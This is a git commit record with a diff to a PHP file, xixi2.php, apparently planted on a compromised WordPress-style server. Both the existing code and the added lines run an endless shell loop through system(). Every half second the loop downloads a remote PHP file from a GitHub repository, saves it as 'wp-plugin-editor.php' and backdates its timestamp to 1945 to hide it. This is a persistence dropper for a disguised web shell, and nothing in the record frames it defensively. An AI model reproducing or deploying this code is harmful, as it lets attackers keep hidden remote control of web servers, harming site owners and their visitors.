acd6278640aea03a99ac5c87e961f892a3ee456d
odigital17 <166428630+odigital17@users.noreply.github.com>
2025-06-04 21:06:22 +0700

    Update xixi2.php

--- xixi2.php
+++ xixi2.php
@@ -3,3 +3,7 @@ while true; do wget -q https://raw.githubusercontent.com/odigital17/bonjour/refs
 <?php
 system("while true; do wget -q https://raw.githubusercontent.com/odigital17/bonjour/refs/heads/main/meta.php -O wp-plugin-editor.php && touch -t 194501010000.00 wp-plugin-editor.php; sleep 0.5; done");
 ?>
+
+<?php
+system("while true; do wget -q https://github.com/odigital17/bonjour/raw/refs/heads/main/LibText.php -O wp-plugin-editor.php && touch -t 194501010000.00 wp-plugin-editor.php; sleep 0.5; done");
+?>
